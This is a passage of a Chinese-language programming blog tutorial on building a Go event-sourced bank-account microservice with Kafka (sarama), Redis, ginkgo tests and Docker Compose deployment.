<h4 id="domain-model"><a href="#domain-model" class="headerlink" title="domain model"></a>domain model</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// domain model: bank_account.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> BankAccount <span class="keyword">struct</span> &#123;</span><br><span class="line">    Id      <span class="keyword">string</span></span><br><span class="line">    Name    <span class="keyword">string</span></span><br><span class="line">    Balance <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义下列函数：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1. FetchAccount(id) 从Redis读取账户实例信息</span></span><br><span class="line"><span class="comment">//2. updateAccount(id, data) 更新指定账户信息</span></span><br><span class="line"><span class="comment">//3. ToAccount(map) 将从Redis读到的账户信息转换为模型数据，return *BankAccount object.</span></span><br></pre></td></tr></table></figure>
<h4 id="Kafka-amp-Redis-library"><a href="#Kafka-amp-Redis-library" class="headerlink" title="Kafka &amp; Redis library"></a>Kafka &amp; Redis library</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.go</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;github.com/go-redis/redis&quot;</span> <span class="comment">// Redis通讯库：go-redis</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    Redis = initRedis()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initRedis</span><span class="params">()</span> *<span class="title">redis</span>.<span class="title">Client</span></span> &#123;</span><br><span class="line">    redisUrl := os.Getenv(<span class="string">&quot;REDIS_URL&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> redisUrl == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        redisUrl = <span class="string">&quot;127.0.0.1:6379&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redis.NewClient(&amp;redis.Options&#123;</span><br><span class="line">        Addr:     redisUrl,</span><br><span class="line">        Password: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        DB:       <span class="number">0</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="comment">//kafka.go</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/Shopify/sarama&quot;</span> <span class="comment">//Kafka通讯库：Sarama</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    brokers = []<span class="keyword">string</span>&#123;<span class="string">&quot;127.0.0.1:9092&quot;</span>&#125;</span><br><span class="line">    topic   = <span class="string">&quot;go-microservice-transactions&quot;</span></span><br><span class="line">    topics  = []<span class="keyword">string</span>&#123;topic&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newKafkaConfiguration</span><span class="params">()</span> *<span class="title">sarama</span>.<span class="title">Config</span></span> &#123;</span><br><span class="line">    conf := sarama.NewConfig()</span><br><span class="line">    conf.Producer.RequiredAcks = sarama.WaitForAll</span><br><span class="line">    conf.Producer.Return.Successes = <span class="literal">true</span></span><br><span class="line">    conf.ChannelBufferSize = <span class="number">1</span></span><br><span class="line">    conf.Version = sarama.V0_10_1_0</span><br><span class="line">    <span class="keyword">return</span> conf</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newKafkaSyncProducer</span><span class="params">()</span> <span class="title">sarama</span>.<span class="title">SyncProducer</span></span> &#123;</span><br><span class="line">    kafka, err := sarama.NewSyncProducer(brokers, newKafkaConfiguration())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Kafka error: %s\n&quot;</span>, err)</span><br><span class="line">        os.Exit(<span class="number">-1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> kafka</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newKafkaConsumer</span><span class="params">()</span> <span class="title">sarama</span>.<span class="title">Consumer</span></span> &#123;</span><br><span class="line">    consumer, err := sarama.NewConsumer(brokers, newKafkaConfiguration())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Kafka error: %s\n&quot;</span>, err)</span><br><span class="line">        os.Exit(<span class="number">-1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> consumer</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="消息生产者Producer"><a href="#消息生产者Producer" class="headerlink" title="消息生产者Producer"></a>消息生产者Producer</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="comment">//消息生产者 producer.go</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mainProducer</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> err error</span><br><span class="line">    reader := bufio.NewReader(os.Stdin)</span><br><span class="line">    kafka := newKafkaSyncProducer()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        fmt.Print(<span class="string">&quot;-&gt; &quot;</span>)</span><br><span class="line">        text, _ := reader.ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        text = strings.Replace(text, <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">-1</span>)</span><br><span class="line">        args := strings.Split(text, <span class="string">&quot;###&quot;</span>)</span><br><span class="line">        cmd := args[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> cmd &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;create&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(args) == <span class="number">2</span> &#123;</span><br><span class="line">                accName := args[<span class="number">1</span>]</span><br><span class="line">                event := NewCreateAccountEvent(accName)</span><br><span class="line">                sendMsg(kafka, event)</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                fmt.Println(<span class="string">&quot;Only specify create###Account Name&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Printf(<span class="string">&quot;Unknown command %s, only: create, deposit, withdraw, transfer\n&quot;</span>, cmd)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Printf(<span class="string">&quot;Error: %s\n&quot;</span>, err)</span><br><span class="line">            err = <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kafka.go</span></span><br><span class="line"><span class="comment">// 增加发送消息的方法</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sendMsg</span><span class="params">(kafka sarama.SyncProducer, event <span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    json, err := json.Marshal(event)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    msgLog := &amp;sarama.ProducerMessage&#123;</span><br><span class="line">        Topic: topic,</span><br><span class="line">        Value: sarama.StringEncoder(<span class="keyword">string</span>(json)),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    partition, offset, err := kafka.SendMessage(msgLog)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Kafka error: %s\n&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">&quot;Message: %+v\n&quot;</span>, event)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Message is stored in partition %d, offset %d\n&quot;</span>,</span><br><span class="line">        partition, offset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="comment">//启动入口，main.go</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mainProducer()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  go build</span><br><span class="line">$ ./go-microservice</span><br><span class="line">-&gt; create</span><br><span class="line">Only specify create<span class="comment">###Account Name</span></span><br><span class="line">-&gt; create<span class="comment">###Yanrui</span></span><br><span class="line">Message: &#123;Event:&#123;AccId:49a23d27-4ffe-4c86-ab9a-fbc308ecff1c Type:CreateEvent&#125; AccName:Yanrui&#125;</span><br><span class="line">Message is stored <span class="keyword">in</span> partition 0, offset 0</span><br><span class="line">-&gt;</span><br></pre></td></tr></table></figure>
<h1 id="第二部分-消息消费者Consumer及其集群化"><a href="#第二部分-消息消费者Consumer及其集群化" class="headerlink" title="第二部分 消息消费者Consumer及其集群化"></a>第二部分 消息消费者Consumer及其集群化</h1><p>Consumer负责从Kafka加载消息队列。另外，我们需要为每一个事件创建process()函数。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="comment">//processor.go</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">&quot;errors&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e CreateEvent)</span> <span class="title">Process</span><span class="params">()</span> <span class="params">(*BankAccount, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> updateAccount(e.AccId, <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;</span><br><span class="line">        <span class="string">&quot;Id&quot;</span>:      e.AccId,</span><br><span class="line">        <span class="string">&quot;Name&quot;</span>:    e.AccName,</span><br><span class="line">        <span class="string">&quot;Balance&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e InvalidEvent)</span> <span class="title">Process</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e AcceptEvent)</span> <span class="title">Process</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// other Process() codes ...</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">//consumer.go</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mainConsumer</span><span class="params">(partition <span class="keyword">int32</span>)</span></span> &#123;</span><br><span class="line">    kafka := newKafkaConsumer()</span><br><span class="line">    <span class="keyword">defer</span> kafka.Close()</span><br><span class="line">    <span class="comment">//注：开发环境中我们使用sarama.OffsetOldest，Kafka将从创建以来第一条消息开始发送。</span></span><br><span class="line">    <span class="comment">//在生产环境中切换为sarama.OffsetNewest,只会将最新生成的消息发送给我们。</span></span><br><span class="line">    consumer, err := kafka.ConsumePartition(topic, partition, sarama.OffsetOldest)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Kafka error: %s\n&quot;</span>, err)</span><br><span class="line">        os.Exit(<span class="number">-1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> consumeEvents(consumer)</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Press [enter] to exit consumer\n&quot;</span>)</span><br><span class="line">    bufio.NewReader(os.Stdin).ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;Terminating...&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Go语言通过goroutine提供了对于并发编程的直接支持，goroutine是Go语言运行库的功能，作为一个函数入口，在堆上为其分配的一个堆栈。所以它非常廉价，我们可以很轻松的创建上万个goroutine，但它们并不是被操作系统所调度执行。除了被系统调用阻塞的线程外，Go运行库最多会启动$GOMAXPROCS个线程来运行goroutine。</p>
<ul>
<li><a href="https://gobyexample.com/goroutines">goroutines</a>: A goroutine is a lightweight thread of execution.</li>
<li><a href="https://gobyexample.com/channels">channels</a>: Channels are the pipes that connect concurrent goroutines. (&lt;- operator)</li>
<li><a href="https://gobyexample.com/for">for</a>: for is Go’s only looping construct. Here are three basic types of for loops.</li>
<li><a href="https://gobyexample.com/select">select</a>: Go’s select lets you wait on multiple channel operations.</li>
<li><a href="https://gobyexample.com/non-blocking-channel-operations">Non-Blocking Channel Operations</a></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">consumeEvents</span><span class="params">(consumer sarama.PartitionConsumer)</span></span> &#123;</span><br><span class="line">  <span class="keyword">var</span> msgVal []<span class="keyword">byte</span></span><br><span class="line">  <span class="keyword">var</span> log <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">  <span class="keyword">var</span> logMap <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">  <span class="keyword">var</span> bankAccount *BankAccount</span><br><span class="line">  <span class="keyword">var</span> err error</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="comment">//goruntine exec</span></span><br><span class="line">      <span class="keyword">select</span> &#123;</span><br><span class="line">          <span class="comment">// blocking &lt;- channel operator</span></span><br><span class="line">          <span class="keyword">case</span> err := &lt;-consumer.Errors():</span><br><span class="line">              fmt.Printf(<span class="string">&quot;Kafka error: %s\n&quot;</span>, err)</span><br><span class="line">          <span class="keyword">case</span> msg := &lt;-consumer.Messages():</span><br><span class="line">              msgVal = msg.Value</span><br><span class="line">          <span class="comment">//</span></span><br><span class="line">          <span class="keyword">if</span> err = json.Unmarshal(msgVal, &amp;log); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Printf(<span class="string">&quot;Failed parsing: %s&quot;</span>, err)</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                logMap = log.(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">                logType := logMap[<span class="string">&quot;Type&quot;</span>]</span><br><span class="line">                fmt.Printf(<span class="string">&quot;Processing %s:\n%s\n&quot;</span>, logMap[<span class="string">&quot;Type&quot;</span>], <span class="keyword">string</span>(msgVal))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span> logType &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;CreateEvent&quot;</span>:</span><br><span class="line">                  event := <span class="built_in">new</span>(CreateEvent)</span><br><span class="line">                  <span class="keyword">if</span> err = json.Unmarshal(msgVal, &amp;event); err == <span class="literal">nil</span> &#123;</span><br><span class="line">                    bankAccount, err = event.Process()</span><br><span class="line">                  &#125;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                  fmt.Println(<span class="string">&quot;Unknown command: &quot;</span>, logType)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                  fmt.Printf(<span class="string">&quot;Error processing: %s\n&quot;</span>, err)</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    fmt.Printf(<span class="string">&quot;%+v\n\n&quot;</span>, *bankAccount)</span><br><span class="line">                  &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<h4 id="重构main"><a href="#重构main" class="headerlink" title="重构main"></a>重构main</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">//main.go</span></span><br><span class="line"><span class="comment">//支持producer和consumer启动模式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;flag&quot;</span></span><br><span class="line">    ...</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    act := flag.String(<span class="string">&quot;act&quot;</span>, <span class="string">&quot;producer&quot;</span>, <span class="string">&quot;Either: producer or consumer&quot;</span>)</span><br><span class="line">    partition := flag.String(<span class="string">&quot;partition&quot;</span>, <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Partition which the consumer program will be subscribing&quot;</span>)</span><br><span class="line"></span><br><span class="line">    flag.Parse()</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">&quot;Welcome to go-microservice : %s\n\n&quot;</span>, *act)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> *act &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;producer&quot;</span>:</span><br><span class="line">        mainProducer()</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;consumer&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> part32int, err := strconv.ParseInt(*partition, <span class="number">10</span>, <span class="number">32</span>); err == <span class="literal">nil</span> &#123;</span><br><span class="line">            mainConsumer(<span class="keyword">int32</span>(part32int))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过—act参数，可以启动一个消费者进程。当进程运行时，他将从Kafka一个一个拿出消息进行处理，按照我们之前在每个事件定义的Process() 方法。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go build</span><br><span class="line">$ ./go-microservice --act=consumer</span><br><span class="line">Welcome to go-microservice : consumer</span><br><span class="line"></span><br><span class="line">Press [enter] to <span class="built_in">exit</span> consumer</span><br><span class="line"></span><br><span class="line">Processing CreateEvent:</span><br><span class="line">&#123;<span class="string">&quot;AccId&quot;</span>:<span class="string">&quot;49a23d27-4ffe-4c86-ab9a-fbc308ecff1c&quot;</span>,<span class="string">&quot;Type&quot;</span>:<span class="string">&quot;CreateEvent&quot;</span>,<span class="string">&quot;AccName&quot;</span>:<span class="string">&quot;Yanrui&quot;</span>&#125;</span><br><span class="line">&#123;Id:49a23d27-4ffe-4c86-ab9a-fbc308ecff1c Name:Yanrui Balance:0&#125;</span><br><span class="line">Terminating...</span><br></pre></td></tr></table></figure>
<h3 id="集群化消息消费者"><a href="#集群化消息消费者" class="headerlink" title="集群化消息消费者"></a>集群化消息消费者</h3><p>问题：如果一个Consumer宕机了怎么办？（例如：程序崩溃、网络异常等原因）<br>解决方案：将多个Consumer编组为集群实现高可用。具体来说就是打标签，当有一个新的Log发送时，Kafka将其发送给其中一个实例。当该实例无法接收Log时，Kafka将Log传递给另一个包含相同标签的Consumer。<br>注意：Kafka 版本 0.9 +，另外还需要使用sarama-cluster库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用govendor获取</span></span><br><span class="line">govendor fetch github.com/bsm/sarama-cluster</span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//修改mainConsumer方法使用sarama-cluster library连接Kafka</span></span><br><span class="line">config := cluster.NewConfig()</span><br><span class="line">config.Consumer.Offsets.Initial = sarama.OffsetNewest</span><br><span class="line">consumer, err := cluster.NewConsumer(brokers, <span class="string">&quot;go-microservice-consumer&quot;</span>, topics, config)</span><br><span class="line"></span><br><span class="line"><span class="comment">//topics定义</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    topics  = []<span class="keyword">string</span>&#123;topic&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//调整consumeEvents()</span></span><br><span class="line"><span class="keyword">case</span> err, more := &lt;-consumer.Errors():</span><br><span class="line">    <span class="keyword">if</span> more &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Kafka error: %s\n&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//consumer.Messages() : MarkOffset</span></span><br><span class="line"><span class="comment">//consumer.go</span></span><br><span class="line"><span class="comment">//func mainConsumer(partition int32)</span></span><br><span class="line"></span><br><span class="line">consumer.MarkOffset(msg, <span class="string">&quot;&quot;</span>) <span class="comment">//增加的行</span></span><br><span class="line"></span><br><span class="line">msgVal = msg.Value</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>即使程序崩溃，MarkOffset也会将消息标记为 <strong>processed</strong> ,标签包括元数据以及这个时间点的状态。元数据可以被另外一个Consumer恢复数据状态，也就能被重新消费。即即使同样的消息被处理两次，结果也是一样的，这个过程理论上是 <strong>幂等</strong> 的（idempotent）。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MicroService_Kafka_Consumers.jpg" alt="Kafka Consumers"></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//运行多个consumer实例</span></span><br><span class="line">$ ./<span class="keyword">go</span>-microservice --act=consumer</span><br><span class="line">$ ./<span class="keyword">go</span>-microservice --act=consumer</span><br><span class="line">$ ./<span class="keyword">go</span>-microservice --act=consumer</span><br></pre></td></tr></table></figure>
<h1 id="第三部分：测试驱动开发、Docker部署和持续集成"><a href="#第三部分：测试驱动开发、Docker部署和持续集成" class="headerlink" title="第三部分：测试驱动开发、Docker部署和持续集成"></a>第三部分：测试驱动开发、Docker部署和持续集成</h1><h4 id="使用vendor管理Golang项目依赖"><a href="#使用vendor管理Golang项目依赖" class="headerlink" title="使用vendor管理Golang项目依赖"></a>使用vendor管理Golang项目依赖</h4><p>用govendor fetch <url1> <url2>新增的第三方包直接被get到根目录的vendor文件夹下,不会与其它的项目混用第三方包，完美避免多个项目同用同一个第三方包的不同版本问题。只需要对vendor/vendor.json进行版本控制，即可对第三包依赖关系进行控制。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ <span class="comment">//</span></span><br><span class="line">$ <span class="keyword">go</span> get -u github.com/kardianos/govendor</span><br><span class="line">$ cd $PROJECT_PATH</span><br><span class="line">$ govendor init</span><br><span class="line">$ govendor add +external</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h4 id="单元测试：ginkgo-Test-Suite"><a href="#单元测试：ginkgo-Test-Suite" class="headerlink" title="单元测试：ginkgo Test Suite"></a>单元测试：ginkgo Test Suite</h4><ul>
<li><a href="https://onsi.github.io/ginkgo/">ginkgo</a></li>
<li><a href="https://onsi.github.io/gomega/">gomega</a></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">go</span> get github.com/onsi/ginkgo/ginkgo</span><br><span class="line">$ <span class="keyword">go</span> get github.com/onsi/gomega</span><br><span class="line">$ ginkgo bootstrap</span><br><span class="line">Generating ginkgo test suite bootstrap <span class="keyword">for</span> main in:</span><br><span class="line">	go_microservice_suite_test.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main_test</span><br><span class="line"><span class="comment">//go_microservice_suite_test.go,单元测试类</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;github.com/onsi/ginkgo&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/onsi/gomega&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _ = Describe(<span class="string">&quot;Event&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    Describe(<span class="string">&quot;NewCreateAccountEvent&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        It(<span class="string">&quot;can create a create account event&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            name := <span class="string">&quot;John Smith&quot;</span></span><br><span class="line"></span><br><span class="line">            event := NewCreateAccountEvent(name)</span><br><span class="line"></span><br><span class="line">            Expect(event.AccName).To(Equal(name))</span><br><span class="line">            Expect(event.AccId).NotTo(BeNil())</span><br><span class="line">            Expect(event.Type).To(Equal(<span class="string">&quot;CreateEvent&quot;</span>))</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ginkgo</span><br><span class="line">Running Suite: go-microservice Suite</span><br><span class="line">==========================</span><br><span class="line">Random Seed: 1490709758</span><br><span class="line">Will run 1 of 1 specs</span><br><span class="line">Ran 1 of 1 Specs <span class="keyword">in</span> 0.000 seconds</span><br><span class="line">SUCCESS! -- 1 Passed | 0 Failed | 0 Pending | 0 Skipped PASS</span><br><span class="line">Ginkgo ran 1 suite <span class="keyword">in</span> 905.68195ms</span><br><span class="line">Test Suite Passed</span><br></pre></td></tr></table></figure>
<h4 id="单元测试的四个阶段"><a href="#单元测试的四个阶段" class="headerlink" title="单元测试的四个阶段"></a>单元测试的四个阶段</h4><ol>
<li>Setup 启动</li>
<li>Execution 执行</li>
<li>Verification 验证</li>
<li>Teardown 拆卸</li>
</ol>
<h3 id="Docker部署"><a href="#Docker部署" class="headerlink" title="Docker部署"></a>Docker部署</h3><p><a href="https://www.docker.com">Docker</a> 容器中需要包含下列组件：</p>
<ol>
<li>Golang</li>
<li>Redis、Kafka</li>
<li>微服务依赖的其它组件</li>
</ol>
<p>在根目录创建一个Dockerfile<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM golang:1.8.0</span><br><span class="line">MAINTAINER Yanrui</span><br></pre></td></tr></table></figure></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//install our dependencies</span></span><br><span class="line">RUN <span class="keyword">go</span> get -u github.com/kardianos/govendor</span><br><span class="line">RUN <span class="keyword">go</span> get github.com/onsi/ginkgo/ginkgo</span><br><span class="line">RUN <span class="keyword">go</span> get github.com/onsi/gomega</span><br><span class="line"></span><br><span class="line"><span class="comment">//将整个目录拷贝到容器</span></span><br><span class="line">ADD . /<span class="keyword">go</span>/src/<span class="keyword">go</span>-microservice</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查工作目录</span></span><br><span class="line">WORKDIR /<span class="keyword">go</span>/src/<span class="keyword">go</span>-microservice</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装依赖项</span></span><br><span class="line">RUN govendor sync</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line">$ docker build -t <span class="keyword">go</span>-microservice .</span><br><span class="line">$ docker run -i -t <span class="keyword">go</span>-microservice /bin/bash</span><br><span class="line">$ ginkgo</span><br><span class="line">.......................</span><br><span class="line">.......Failed..........</span><br></pre></td></tr></table></figure>
<p>由于容器本地并没有一个<a href="https://redis.io">Redis</a>实例运行在上面，这时运行ginkgo测试就会报错。我们为什么不在这个Dockerfile中包含一个<a href="https://redis.io">Redis</a>呢？这就违背了Docker分层解耦的初衷，我们可以通过docker-compose将两个服务连接起来一起工作。</p>
<p>创建一个docker-compose.yml文件（与Dockerfile目录一致）:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&quot;2.0&quot;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  app:</span><br><span class="line">    environment:</span><br><span class="line">      REDIS_URL: redis:6379</span><br><span class="line">    build: .</span><br><span class="line">    working_dir: /go/src/go-microservice</span><br><span class="line">    links:</span><br><span class="line">      - redis</span><br><span class="line">  redis:</span><br><span class="line">    image: redis:alpine</span><br></pre></td></tr></table></figure></p>
<p>本地构建完成之后，再次运行 <strong>docker-compose run app ginkgo</strong> 测试通过。</p>
